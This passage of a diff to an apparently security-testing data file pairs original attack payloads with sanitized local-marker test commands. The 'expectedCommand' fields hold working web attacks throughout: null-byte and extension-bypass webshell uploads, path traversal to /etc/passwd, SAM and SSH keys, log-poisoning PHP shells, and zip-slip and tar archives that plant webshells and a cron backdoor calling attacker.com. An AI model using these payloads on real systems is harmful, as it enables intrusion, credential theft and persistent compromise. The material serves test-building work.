+          "expectedCommand": "# 方法1: URL编码空字节:\ncurl -F \"file=@shell.php;filename=shell.php%00.jpg\" \"http://target.com/upload\"\n\n# 方法2: 在Burp中修改原始字节:\n# 将文件名 shell.php[0x00].jpg 中的[0x00]替换为实际的空字节\n# Burp Repeater → 选中%00 → 右键 → Convert → URL decode\n\n# 方法3: Python发送:\nimport requests\nfiles = {\"file\": (\"shell.php\u0000.jpg\", open(\"shell.php\",\"rb\"), \"image/jpeg\")}\nr = requests.post(\"http://target.com/upload\", files=files)\nprint(r.status_code, r.text[:200])",
+          "command": "import socket\n\nhost, port = \"127.0.0.1\", 8080\nboundary = b\"PAYLOADER_BOUNDARY\"\nfilename = b\"PAYLOADER_MARKER.txt\\x00.jpg\"\nbody = b\"--\" + boundary + b\"\\r\\nContent-Disposition: form-data; name=\\\"file\\\"; filename=\\\"\" + filename + b\"\\\"\\r\\nContent-Type: text/plain\\r\\n\\r\\nPAYLOADER_MARKER\\r\\n--\" + boundary + b\"--\\r\\n\"\nrequest = b\"POST /upload HTTP/1.1\\r\\nHost: 127.0.0.1:8080\\r\\nContent-Type: multipart/form-data; boundary=\" + boundary + b\"\\r\\nContent-Length: \" + str(len(body)).encode(\"ascii\") + b\"\\r\\nConnection: close\\r\\n\\r\\n\" + body\nwith socket.create_connection((host, port), timeout=3) as sock:\n    sock.sendall(request)\n    print(sock.recv(4096).decode(\"latin-1\", errors=\"replace\"))"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# PHP文件包含中的空字节截断:\n# 服务端代码: include($_GET[\"page\"] . \".php\");\n\n# 正常请求:\ncurl \"http://target.com/index.php?page=about\"   # → include(\"about.php\")\n\n# 空字节截断:\ncurl \"http://target.com/index.php?page=../../../etc/passwd%00\"\n# → include(\"../../../etc/passwd\u0000.php\")\n# → 实际读取 ../../../etc/passwd (\u0000截断了.php)\n\n# 配合路径遍历:\ncurl \"http://target.com/index.php?page=../../../var/log/apache2/access.log%00\"\ncurl \"http://target.com/index.php?page=php://filter/convert.base64-encode/resource=config%00\"",
+          "command": "BASE=\"http://127.0.0.1:8080\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=PAYLOADER_MARKER\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=../fixtures/PAYLOADER_MARKER%00\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/include?page=../fixtures/MISSING_MARKER%00\"\nprintf \"%s\\n\" \"compare parser log, canonical path, and exact PAYLOADER_MARKER output\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# PHP 5.3.4+已修复空字节截断，替代方案:\n\n# 1. 路径截断(超长路径):\n# Windows MAX_PATH=260, Linux PATH_MAX=4096\npayload=\"shell.php\" + \"/./\" * 2048 + \".jpg\"\ncurl \"http://target.com/upload\" -F \"file=@shell.php;filename=$payload\"\n\n# 2. 点号截断(Windows):\n# Windows忽略文件名末尾的点号和空格\ncurl -F \"file=@shell.php;filename=shell.php.\" \"http://target.com/upload\"\ncurl -F \"file=@shell.php;filename=shell.php \" \"http://target.com/upload\"\ncurl -F \"file=@shell.php;filename=shell.php::$DATA\" \"http://target.com/upload\"\n\n# 3. 大小写绕过:\ncurl -F \"file=@shell.pHP;type=image/jpeg\" \"http://target.com/upload\"",
+          "command": "import tempfile\nfrom pathlib import Path\nimport requests\n\nBASE = \"http://127.0.0.1:8080\"\nnames = [\n    \"PAYLOADER_MARKER.txt.\",\n    \"PAYLOADER_MARKER.txt \",\n    \"PAYLOADER_MARKER.txt::$DATA\",\n    \"PAYLOADER_MARKER.TXT\",\n    \"PAYLOADER_MARKER.txt\" + \"/./\" * 64,\n]\nwith tempfile.TemporaryDirectory(prefix=\"payloader-name-\") as directory:\n    marker = Path(directory) / \"PAYLOADER_MARKER.txt\"\n    marker.write_text(\"PAYLOADER_MARKER\", encoding=\"utf-8\")\n    for name in names:\n        with marker.open(\"rb\") as handle:\n            response = requests.post(f\"{BASE}/upload\", files={\"file\": (name, handle, \"text/plain\")}, timeout=3)\n        print(repr(name), response.status_code)"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# PHP路径长度截断（PHP < 5.3, 超过4096字符）\n../../etc/passwd/././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././.\n\n# 超长扩展名截断\ntest.php.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\n# 点号截断（Windows MAX_PATH=260）\ntest.php...........................................................................",
+          "command": "../outside/PAYLOADER_MARKER.txt/./././././././././././././././.\n\nPAYLOADER_MARKER.txt.aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\n\nPAYLOADER_MARKER.txt................................"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 点空格点截断（Windows NTFS）\ntest.php. . . .\ntest.php::$DATA\ntest.php::$DATA.jpg\n\n# ADS流隐藏扩展名\ntest.php::$INDEX_ALLOCATION\ntest.asp;.jpg\ntest.asp%00.jpg\n\n# Windows短文件名（8.3格式）\nTESTPH~1.PHP\nSHELL~1.PHP",
+          "command": "PAYLOADER_MARKER.txt. . . .\nPAYLOADER_MARKER.txt::$DATA\nPAYLOADER_MARKER.txt::$DATA.txt\n\nPAYLOADER_MARKER.txt::$INDEX_ALLOCATION\nPAYLOADER_MARKER.txt:marker.txt:DATA\nPAYLOADER_MARKER.txt%00.txt\n\nPAYLO~1.TXT"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# 不同编码的空字节\ntest.php%00.jpg\ntest.php\\x00.jpg\ntest.php\\0.jpg\ntest.php\\u0000.jpg\n\n# URL编码变体\ntest.php%2500.jpg   # 双重编码空字节\ntest.php%u0000.jpg  # UTF-16空字节\n\n# 特殊终止符\ntest.php%0d.jpg     # 回车符\ntest.php%0a.jpg     # 换行符\ntest.php%1a.jpg     # EOF标记",
+          "command": "PAYLOADER_MARKER.txt%00.jpg\nPAYLOADER_MARKER.txt%2500.jpg\nPAYLOADER_MARKER.txt%u0000.jpg\n\nPAYLOADER_MARKER.txt%0d.jpg\nPAYLOADER_MARKER.txt%0a.jpg\nPAYLOADER_MARKER.txt%1a.jpg"
+        }
+      ]
+    },
+    {
+      "id": "file-traversal",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 基础遍历:\ncurl \"http://target.com/file?path=../../../../etc/passwd\"\ncurl \"http://target.com/image?name=../../../../etc/passwd\"\n\n# 测试遍历深度(通常3-10层足够到根目录):\nfor i in $(seq 1 10); do\n  traversal=$(printf \"../%.0s\" $(seq 1 $i))\n  resp=$(curl -s -o /dev/null -w \"%{http_code}:%{size_download}\" \"http://target.com/file?path=${traversal}etc/passwd\")\n  echo \"Depth $i: $resp\"\ndone",
+          "command": "BASE=\"http://127.0.0.1:8080/file?path=\"\nfor depth in 1 2 3 4; do\n  traversal=$(printf \"../%.0s\" $(seq 1 \"$depth\"))\n  value=$(curl --fail --silent --show-error --max-time 3 \"${BASE}${traversal}outside/PAYLOADER_MARKER.txt\" || true)\n  [ \"$value\" = \"PAYLOADER_MARKER\" ] && printf \"marker_read depth=%s\\n\" \"$depth\"\ndone"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# URL编码:\ncurl \"http://target.com/file?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd\"\n\n# 双重URL编码:\ncurl \"http://target.com/file?path=%252e%252e%252f%252e%252e%252fetc/passwd\"\n\n# Unicode编码:\ncurl \"http://target.com/file?path=..%c0%afetc/passwd\"\ncurl \"http://target.com/file?path=..%ef%bc%8fetc/passwd\"\n\n# 空字节截断(PHP<5.3.4):\ncurl \"http://target.com/file?path=../../../../etc/passwd%00.jpg\"\n\n# 双写绕过(服务端删除../一次):\ncurl \"http://target.com/file?path=....//....//....//etc/passwd\"\n\n# 反斜杠(Windows):\ncurl \"http://target.com/file?path=......windowswin.ini\"\n\n# 混合斜杠:\ncurl \"http://target.com/file?path=../../../../etc/passwd\"",
+          "command": "BASE=\"http://127.0.0.1:8080/file?path=\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%2e%2e%2foutside%2fPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%252e%252e%252foutside%252fPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}....//outside/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}..%5coutside%5cPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../outside/PAYLOADER_MARKER.txt%00.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../outside/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# UNC路径(可能触发SMB认证):\ncurl \"http://target.com/file?path=\\attacker.comshare\test\"\n\n# Windows敏感文件:\ncurl \"http://target.com/file?path=C:Windowswin.ini\"\ncurl \"http://target.com/file?path=C:WindowsSystem32configSAM\"\ncurl \"http://target.com/file?path=C:inetpubwwwrootweb.config\"\ncurl \"http://target.com/file?path=C:UsersAdministrator.sshid_rsa\"\n\n# IIS短文件名枚举:\ncurl -v \"http://target.com/file?path=C:inetpubwwwrootWEB~1.CON\"",
+          "command": "BASE=\"http://127.0.0.1:8080/file?path=\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}%5c%5ccallback.example.invalid%5cpayloader%5cPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}C:%5cpayloader-fixture%5cPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}C:%5cpayloader-fixture%5csubdir%5c..%5cPAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}PAYLOA~1.TXT\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 1. 日志文件包含(Log Poisoning):\ncurl \"http://target.com/\" -A \"<?php system($_GET['cmd']); ?>\"\ncurl \"http://target.com/file?path=../../../var/log/apache2/access.log&cmd=id\"\n\n# 2. /proc/self/environ包含:\ncurl \"http://target.com/file?path=../../../proc/self/environ\" -A \"<?php system($_GET['c']); ?>\"\n\n# 3. PHP Session文件包含:\n# 先在session中写入payload(如用户名字段)\n# 然后包含session文件:\ncurl \"http://target.com/file?path=../../../tmp/sess_SESSION_ID\"\n\n# 4. PHP Filter读取源码:\ncurl \"http://target.com/file?path=php://filter/convert.base64-encode/resource=config.php\"",
+          "command": "BASE=\"http://127.0.0.1:8080/include?path=\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.log\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/PAYLOADER_MARKER.env\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}../fixtures/sess_PAYLOADER_MARKER\"\ncurl --fail --silent --show-error --max-time 3 \"${BASE}php://filter/convert.base64-encode/resource=/tmp/payloader-fixture/PAYLOADER_MARKER.txt\"\nprintf \"%s\\n\" \"require exact marker output and final include path audit\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 双重URL编码\n..%252f..%252f..%252fetc%252fpasswd\n\n# Unicode/UTF-8超长编码\n..%c0%af..%c0%afetc/passwd\n..%e0%80%af..%e0%80%afetc/passwd\n\n# 16位Unicode编码\n..%u002f..%u002fetc/passwd\n..%u2215..%u2215etc/passwd\n\n# URL编码混合\n%2e%2e/%2e%2e/%2e%2e/etc/passwd\n%2e%2e%5c%2e%2e%5cetc%5cpasswd",
+          "command": "..%252foutside%252fPAYLOADER_MARKER.txt\n%2e%2e%2foutside%2fPAYLOADER_MARKER.txt\n%2e%2e%5coutside%5cPAYLOADER_MARKER.txt\n\n..%2foutside%2fPAYLOADER_MARKER.txt\n..%5coutside%5cPAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 反斜杠替代（IIS/Windows）\n..\\..\\..\\etc\\passwd\n..\\\\..\\\\..\\\\windows\\\\win.ini\n\n# 点斜杠变体\n....//....//....//etc/passwd\n..;/..;/..;/etc/passwd\n..%00/..%00/etc/passwd\n\n# Java/Tomcat特殊处理\n/..;/..;/..;/etc/passwd\n/.;/../.;/../etc/passwd\n\n# Nginx路径折叠\n/static/../../../etc/passwd\n/images/..%2f..%2f..%2fetc/passwd",
+          "command": "..\\outside\\PAYLOADER_MARKER.txt\n..%5coutside%5cPAYLOADER_MARKER.txt\n\n....//outside/PAYLOADER_MARKER.txt\n..;/outside/PAYLOADER_MARKER.txt\n\n/..;/outside/PAYLOADER_MARKER.txt\n/.;/../outside/PAYLOADER_MARKER.txt\n\n/static/../outside/PAYLOADER_MARKER.txt\n/images/..%2foutside%2fPAYLOADER_MARKER.txt"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
+          "expectedCommand": "# 空字节截断\n../../etc/passwd%00.png\n../../etc/passwd\\x00.jpg\n\n# Windows短文件名\n..\\..\\..\\WINDOW~1\\system32\\drivers\\etc\\hosts\n\n# 超长路径截断（PHP < 5.3）\n../../etc/passwd/./././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././\n\n# 点空格点截断（Windows）\n../../windows/win.ini. . .",
+          "command": "../outside/PAYLOADER_MARKER.txt%00.txt\n../outside/PAYLOADER_MARKER.txt%2500.txt\n\n..%5coutside%5cPAYLOA~1.TXT\n\n../outside/PAYLOADER_MARKER.txt/./././././././.\n\n../outside/PAYLOADER_MARKER.txt. . ."
+        }
+      ]
+    },
+    {
+      "id": "file-upload-bypass",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "shell.php.jpg\nshell.php%00.jpg\nshell.phtml\nshell.php5\nshell.phar\nshell.PhP",
+          "command": "PAYLOADER_MARKER.txt.jpg\nPAYLOADER_MARKER.txt%00.jpg\nPAYLOADER_MARKER.phtml.txt\nPAYLOADER_MARKER.php5.txt\nPAYLOADER_MARKER.phar.txt\nPAYLOADER_MARKER.TxT"
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "Content-Type: image/jpeg\nContent-Type: image/png",
+          "command": "Content-Type: text/plain\nContent-Type: application/octet-stream"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "copy normal.jpg/b + shell.php/a webshell.jpg",
+          "command": "cmd /d /c \"mkdir payloader-fixture 2>nul & copy /b payloader-fixture\\normal.jpg+payloader-fixture\\PAYLOADER_MARKER.txt payloader-fixture\\marker.jpg\"\ncmd /d /c \"certutil -hashfile payloader-fixture\\marker.jpg SHA256\"\ncmd /d /c \"del /q payloader-fixture\\marker.jpg\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 空格/空字符绕过后缀检测:\n# 1. 文件名末尾加空格(Windows特性，保存时自动去除):\nfilename=\"shell.php \"\n\n# 2. %20编码空格:\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php%20\"\n\n# 3. 空字节截断(PHP<5.3.4):\nfilename=\"shell.php%00.jpg\"\nfilename=\"shell.php\u0000.jpg\"\n\n# 4. 制表符注入:\nfilename=\"shell.php%09.jpg\"\n\n# Burp中操作: 拦截上传请求 → 在filename中的.php后手动添加空格/空字节",
+          "command": "filename=\"PAYLOADER_MARKER.txt \"\nfilename=\"PAYLOADER_MARKER.txt%20\"\nfilename=\"PAYLOADER_MARKER.txt%00.jpg\"\nfilename=\"PAYLOADER_MARKER.txt%09.jpg\"\nContent-Disposition: form-data; name=\"file\"; filename=\"PAYLOADER_MARKER.txt%20\""
+        },
+        {
+          "area": "execution",
+          "index": 4,
+          "expectedCommand": "# 点号/特殊字符绕过:\n# 1. 末尾加点(Windows会自动去除末尾的点):\nfilename=\"shell.php.\"\nfilename=\"shell.php...\"\n\n# 2. 点+空格组合:\nfilename=\"shell.php. \"\nfilename=\"shell.php .jpg\"\n\n# 3. 分号截断(IIS 6.0):\nfilename=\"shell.asp;.jpg\"\nfilename=\"test.asp;x.jpg\"\n\n# 4. ::概念(不执行，仅说明)\n# Windows NTFS流: shell.php::DATA_STREAM\n\n# 5. 换行符注入:\nfilename=\"shell.ph\np\"\n\n# 测试: 上传后访问URL，确认文件是否被当作PHP解析\ncurl \"http://target.com/uploads/shell.php.\" -v",
+          "command": "filename=\"PAYLOADER_MARKER.txt.\"\nfilename=\"PAYLOADER_MARKER.txt...\"\nfilename=\"PAYLOADER_MARKER.txt. \"\nfilename=\"PAYLOADER_MARKER.txt .jpg\"\nfilename=\"PAYLOADER_MARKER.asp;.txt\"\nfilename=\"PAYLOADER_MARKER.asp;x.txt\"\nfilename=\"PAYLOADER_MARKER.txt%0apadding\"\ncurl --fail --silent --show-error --max-time 3 --head \"http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt.\""
+        },
+        {
+          "area": "execution",
+          "index": 5,
+          "expectedCommand": "# Windows NTFS备用数据流绕过:\n# 1. 标准NTFS ADS绕过:\nfilename=\"shell.php::DATA\"\n# Windows会自动忽略::DATA后缀，文件保存为shell.php\n\n# 2. 其他ADS变体:\nfilename=\"shell.php::INDEX_ALLOCATION\"\nfilename=\"shell.php:evil.php\"\nfilename=\"shell.php:evil.txt:DATA\"\n\n# 3. 在Burp中操作:\n# 拦截上传请求\n# 修改filename为: shell.php::DATA\n# 发送请求\n\n# 4. 验证文件是否上传:\ncurl \"http://target.com/uploads/shell.php\" -v\ncurl \"http://target.com/uploads/shell.php::DATA\" -v\n\n# 注意: 仅在Windows(IIS/NTFS)环境有效，Linux无此特性",
+          "command": "filename=\"PAYLOADER_MARKER.txt::DATA\"\nfilename=\"PAYLOADER_MARKER.txt::INDEX_ALLOCATION\"\nfilename=\"PAYLOADER_MARKER.txt:marker.txt:DATA\"\ncurl --fail --silent --show-error --max-time 3 --head \"http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt\"\ncurl --fail --silent --show-error --max-time 3 --head \"http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt::DATA\""
+        },
+        {
+          "area": "execution",
+          "index": 6,
+          "expectedCommand": "# 双写后缀绕过(当服务器仅删除一次敏感后缀时):\n# 1. PHP双写:\nfilename=\"shell.pphphp\"    # 删除php后剩余shell.php\nfilename=\"shell.pHPhp\"     # 大小写混合双写\nfilename=\"shell.phphpp\"    # 不同位置双写\n\n# 2. ASP双写:\nfilename=\"shell.asaspp\"    # 删除asp后剩余shell.asp\nfilename=\"shell.aaspsp\"\n\n# 3. JSP双写:\nfilename=\"shell.jjspsp\"\n\n# 4. 多层嵌套:\nfilename=\"shell.phpphpphp\" # 两次删除后仍为.php\n\n# 5. 结合大小写:\nfilename=\"shell.PhPhPp\"\n\n# 验证: 上传后确认服务器保存的实际文件名\ncurl -I \"http://target.com/uploads/shell.php\"",
+          "command": "filename=\"PAYLOADER_MARKER.ttxtxt\"\nfilename=\"PAYLOADER_MARKER.tTxTxt\"\nfilename=\"PAYLOADER_MARKER.txttxtt\"\nfilename=\"PAYLOADER_MARKER.aasasa\"\nfilename=\"PAYLOADER_MARKER.jjsjs\"\nfilename=\"PAYLOADER_MARKER.txttxttxt\"\ncurl --fail --silent --show-error --max-time 3 --head \"http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 双扩展名:\nshell.php.jpg\nshell.jpg.php\nshell.php.test\nshell.php%00.jpg\n\n# NTFS备用数据流(Windows):\nshell.php::$DATA\nshell.php::$DATA.jpg\nshell.asp;.jpg\n\n# 特殊字符:\nshell.php%20\nshell.php.\nshell.php....\nshell.php\u0000.jpg",
+          "command": "PAYLOADER_MARKER.txt.jpg\nPAYLOADER_MARKER.jpg.txt\nPAYLOADER_MARKER.txt.bin\nPAYLOADER_MARKER.txt%00.jpg\n\nPAYLOADER_MARKER.txt::$DATA\nPAYLOADER_MARKER.txt::$DATA.jpg\nPAYLOADER_MARKER.asp;.txt\n\nPAYLOADER_MARKER.txt%20\nPAYLOADER_MARKER.txt.\nPAYLOADER_MARKER.txt...."
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# Content-Disposition字段名包裹绕过:\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\nContent-Disposition: form-data; name=\"file\"; filename*=UTF-8''shell.php\nContent-Disposition: form-data; name=\"file\"; filename=\"shell.php\"\n\n# 分块传输编码:\nTransfer-Encoding: chunked\n\n# PHP Wrapper上传:\nzip://uploads/avatar.jpg%23shell\nphar://uploads/avatar.jpg/shell.php\n\n# 竞态条件:\n# 上传后立即在文件被删除前访问",
+          "command": "curl --fail --silent --show-error --max-time 3 --http1.1 \\\n  -F \"file=@./payloader-fixture/PAYLOADER_MARKER.txt;type=text/plain;filename=PAYLOADER_MARKER.txt\" \\\n  -H \"Expect:\" \"http://127.0.0.1:8080/upload\"\n\ncurl --fail --silent --show-error --max-time 3 --http1.1 \\\n  -H \"Transfer-Encoding: chunked\" \\\n  -F \"file=@./payloader-fixture/PAYLOADER_MARKER.txt;type=text/plain;filename=PAYLOADER_MARKER.txt\" \\\n  \"http://127.0.0.1:8080/upload\"\n\nprintf \"%s\\n\" \"zip:///tmp/payloader-fixture/PAYLOADER_MARKER.zip#marker.txt\"\nprintf \"%s\\n\" \"phar:///tmp/payloader-fixture/PAYLOADER_MARKER.phar/marker.txt\""
+        }
+      ]
+    },
+    {
+      "id": "file-zip-slip",
+      "patches": [
+        {
+          "area": "execution",
+          "index": 0,
+          "expectedCommand": "# 常见的ZIP上传解压场景:\n# - 批量文件上传(模板/资源导入)\n# - 插件/主题安装(WordPress/Discuz)\n# - 备份恢复功能\n# - 文档处理(DOCX/XLSX本质是ZIP)\n\n# 测试正常ZIP上传:\necho \"test\" > test.txt\nzip test.zip test.txt\ncurl -F \"file=@test.zip\" \"http://target.com/upload/batch\"\n\n# 确认解压后文件的存储路径:\ncurl \"http://target.com/uploads/test.txt\"",
+          "command": "WORK=$(mktemp -d)\ntrap 'rm -rf \"$WORK\"' EXIT\nprintf \"%s\" \"PAYLOADER_MARKER\" > \"$WORK/PAYLOADER_MARKER.txt\"\n(cd \"$WORK\" && zip -q normal.zip PAYLOADER_MARKER.txt)\nunzip -Z1 \"$WORK/normal.zip\"\ncurl --fail --silent --show-error --max-time 3 -F \"file=@$WORK/normal.zip;type=application/zip\" \"http://127.0.0.1:8080/upload/batch\"\ncurl --fail --silent --show-error --max-time 3 --head \"http://127.0.0.1:8080/uploads/PAYLOADER_MARKER.txt\""
+        },
+        {
+          "area": "execution",
+          "index": 1,
+          "expectedCommand": "# Python脚本创建恶意ZIP:\nimport zipfile\nimport os\n\n# 目标：写入webshell到web根目录\nwith zipfile.ZipFile(\"evil.zip\", \"w\") as zf:\n    # 正常文件(伪装)\n    zf.writestr(\"readme.txt\", \"Normal file\")\n    # 恶意文件(路径遍历)\n    zf.writestr(\"../../../var/www/html/test_shell.php\",\n                \"<?php echo system($_GET['cmd']); ?>\")\n    # 或覆盖配置文件:\n    zf.writestr(\"../../../../../../etc/cron.d/backdoor\",\n                \"* * * * * root curl http://attacker.com/callback\")\n\nprint(\"[+] evil.zip created\")\nprint(\"Files in ZIP:\")\nwith zipfile.ZipFile(\"evil.zip\", \"r\") as zf:\n    for info in zf.infolist():\n        print(f\"  {info.filename} ({info.file_size} bytes)\")",
+          "command": "import zipfile\nfrom pathlib import Path\n\nroot = Path(\"payloader-fixture\")\nroot.mkdir(exist_ok=True)\narchive = root / \"path-traversal.zip\"\nwith zipfile.ZipFile(archive, \"w\") as output:\n    output.writestr(\"readme.txt\", \"PAYLOADER_SAFE_CONTROL\")\n    output.writestr(\"../outside/PAYLOADER_MARKER.txt\", \"PAYLOADER_MARKER\")\nwith zipfile.ZipFile(archive, \"r\") as input_archive:\n    for info in input_archive.infolist():\n        print(info.filename, info.file_size)"
+        },
+        {
+          "area": "execution",
+          "index": 2,
+          "expectedCommand": "# 上传恶意ZIP\ncurl -F \"file=@evil.zip\" \"http://target.com/upload/batch\"\n\n# 验证webshell写入成功\ncurl \"http://target.com/test_shell.php?cmd=id\"\ncurl \"http://target.com/test_shell.php?cmd=whoami\"\n\n# 如果目标是Java应用(WAR包):\n# 构造恶意WAR/JAR包(本质也是ZIP):\njar cf evil.war -C webshell/ .\n# 或修改文件名为../../../webapps/ROOT/shell.jsp",
+          "command": "ARCHIVE=\"./payloader-fixture/path-traversal.zip\"\nBASE=\"http://127.0.0.1:8080\"\nresponse=$(curl --fail --silent --show-error --max-time 5 -F \"file=@${ARCHIVE};type=application/zip\" \"$BASE/upload/batch\")\nprintf \"%s\\n\" \"$response\"\ncurl --fail --silent --show-error --max-time 3 --head \"$BASE/jobs/PAYLOADER_MARKER/status\"\ncurl --fail --silent --show-error --max-time 3 \"$BASE/test-output/outside/PAYLOADER_MARKER.txt\" | grep --fixed-strings \"PAYLOADER_MARKER\"\nrm -f \"$ARCHIVE\""
+        },
+        {
+          "area": "execution",
+          "index": 3,
+          "expectedCommand": "# 构造恶意TAR包:\nimport tarfile\nimport io\n\nwith tarfile.open(\"evil.tar.gz\", \"w:gz\") as tar:\n    # 添加恶意文件\n    content = b\"<?php system($_GET['cmd']); ?>\"\n    info = tarfile.TarInfo(name=\"../../../var/www/html/test_t.php\")\n    info.size = len(content)\n    tar.addfile(info, io.BytesIO(content))\n\n# 使用符号链接攻击:\nimport tarfile\nwith tarfile.open(\"evil_symlink.tar.gz\", \"w:gz\") as tar:\n    # 创建指向/etc/passwd的符号链接\n    info = tarfile.TarInfo(name=\"link_to_passwd\")\n    info.type = tarfile.SYMTYPE\n    info.linkname = \"/etc/passwd\"\n    tar.addfile(info)\n    # 然后通过\"link_to_passwd\"覆盖目标文件\n    content = b\"root:x:0:0:root:/root:/bin/bash\"\n    info2 = tarfile.TarInfo(name=\"link_to_passwd\")\n    info2.size = len(content)\n    tar.addfile(info2, io.BytesIO(content))",
+          "command": "import io\nimport tarfile\nfrom pathlib import Path\n\nroot = Path(\"payloader-fixture\")\nroot.mkdir(exist_ok=True)\ncontent = b\"PAYLOADER_MARKER\"\nwith tarfile.open(root / \"path-traversal.tar.gz\", \"w:gz\") as archive:\n    member = tarfile.TarInfo(\"../outside/PAYLOADER_MARKER.txt\")\n    member.size = len(content)\n    archive.addfile(member, io.BytesIO(content))\nwith tarfile.open(root / \"symlink.tar.gz\", \"w:gz\") as archive:\n    link = tarfile.TarInfo(\"marker-link\")\n    link.type = tarfile.SYMTYPE\n    link.linkname = \"../outside/PAYLOADER_MARKER.txt\"\n    archive.addfile(link)\nfor path in root.glob(\"*.tar.gz\"):\n    with tarfile.open(path, \"r:gz\") as archive:\n        print(path.name, [(m.name, m.linkname) for m in archive.getmembers()])"
+        },
+        {
+          "area": "wafBypass",
+          "index": 0,
+          "expectedCommand": "# 使用tar格式（可能未被检测）\nimport tarfile, io\nwith tarfile.open('test.tar.gz', 'w:gz') as tar:\n    info = tarfile.TarInfo(name='../../../tmp/test.txt')\n    info.size = 14\n    tar.addfile(info, io.BytesIO(b'security_check'))\n\n# 使用7z格式\n7z a test.7z ../../../tmp/test.txt\n\n# 使用cpio格式\necho \"../../../tmp/test.txt\" | cpio -o > test.cpio",
+          "command": "import io\nimport tarfile\nimport zipfile\nfrom pathlib import Path\n\nroot = Path(\"payloader-fixture\")\nroot.mkdir(exist_ok=True)\ncontent = b\"PAYLOADER_MARKER\"\nwith tarfile.open(root / \"alternate.tar.gz\", \"w:gz\") as archive:\n    member = tarfile.TarInfo(\"../outside/PAYLOADER_MARKER.txt\")\n    member.size = len(content)\n    archive.addfile(member, io.BytesIO(content))\nwith zipfile.ZipFile(root / \"alternate.zip\", \"w\") as archive:\n    archive.writestr(\"../outside/PAYLOADER_MARKER.txt\", content)\nprint([path.name for path in root.glob(\"alternate.*\")])"
+        },
+        {
+          "area": "wafBypass",
+          "index": 1,
+          "expectedCommand": "# 创建包含符号链接的压缩包\nimport zipfile, os\n\n# 方法1: tar符号链接\nimport tarfile\nwith tarfile.open('symlink.tar.gz', 'w:gz') as tar:\n    info = tarfile.TarInfo(name='link')\n    info.type = tarfile.SYMTYPE\n    info.linkname = '/etc/passwd'\n    tar.addfile(info)\n\n# 方法2: zip中嵌入符号链接（Linux）\nos.symlink('/etc/passwd', '/tmp/link')\nwith zipfile.ZipFile('symlink.zip', 'w') as zf:\n    zf.write('/tmp/link', 'link')",
+          "command": "import stat\nimport tarfile\nimport zipfile\nfrom pathlib import Path\n\nroot = Path(\"payloader-fixture\")\nroot.mkdir(exist_ok=True)\ntarget = \"../outside/PAYLOADER_MARKER.txt\"\nwith tarfile.open(root / \"symlink.tar.gz\", \"w:gz\") as archive:\n    info = tarfile.TarInfo(\"marker-link\")\n    info.type = tarfile.SYMTYPE\n    info.linkname = target\n    archive.addfile(info)\nwith zipfile.ZipFile(root / \"symlink.zip\", \"w\") as archive:\n    info = zipfile.ZipInfo(\"marker-link\")\n    info.create_system = 3\n    info.external_attr = (stat.S_IFLNK | 0o777) << 16\n    archive.writestr(info, target)\nprint(target)"
+        },
+        {
+          "area": "wafBypass",
+          "index": 2,
